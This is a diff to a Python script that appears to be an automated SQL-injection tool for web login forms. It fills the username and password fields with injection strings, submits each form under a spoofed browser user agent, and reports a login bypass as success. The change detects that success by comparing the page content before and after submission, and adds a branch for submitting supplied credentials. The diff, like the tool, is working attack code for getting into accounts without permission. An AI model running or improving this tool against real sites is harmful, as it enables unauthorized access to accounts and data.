@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
 import urllib.response
-
 import time
 import sys
 import argparse
@@ -25,7 +24,7 @@ class MY_SQL_IN:
                  request.set_handle_redirect(True)
                  request.set_handle_refresh(True, max_time=1)
                  request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-                 request.open(url)
+                 Get_Oregnal_URL = request.open(url).read()                
                  request.select_form(nr = 0)
                  if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                  and not self.args.UserInput and not self.args.PassInput:
@@ -83,6 +82,10 @@ class MY_SQL_IN:
                  and self.args.UserInput and self.args.PassInput:
                        request['username']=f'{command}'
                        request[f'{self.args.PassForm}']=f'{command}'  
+                 elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
+                 and self.args.UserInput and self.args.PassInput:
+                       request['username']=f'{self.args.user}'
+                       request[f'{self.args.PassForm}']=f'{self.args.password}'        
                  else:
                      print('[!] Command Not Found')
                      print('[!] Plases see the help options to how to use ')
@@ -90,8 +93,9 @@ class MY_SQL_IN:
                                        
                  response   = request.submit()
                  content    = response.read()
-                 passlogin  = response.geturl()       
-                 if  passlogin == url :
+                 passlogin  = response.geturl() 
+                 Get_URL_Content = request.open(passlogin).read()                          
+                 if  Get_URL_Content == Get_Oregnal_URL  :
                      print('\n[*] SLQ Injaction Command    : ', command )
                      print('[*] Login Page  URL          : ', url )                    
                      print('[*] Status                   :  NOT LOGIN') 
@@ -162,9 +166,13 @@ class MY_SQL_IN:
                       elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
                       and self.args.UserInput and self.args.PassInput:     
                           print('[+] username           : '+f'{command}')
-                          print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')                         
+                          print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
+                      elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
+                      and self.args.UserInput and self.args.PassInput:     
+                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{self.args.user}')
+                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')                       
                       exit()
-                      
+                         
              print('[!] Web May Not Vulnerable To SQL Injaction ')
              print('[*] Saugger To Use anther list Command ')  
          except urllib.error.URLError:
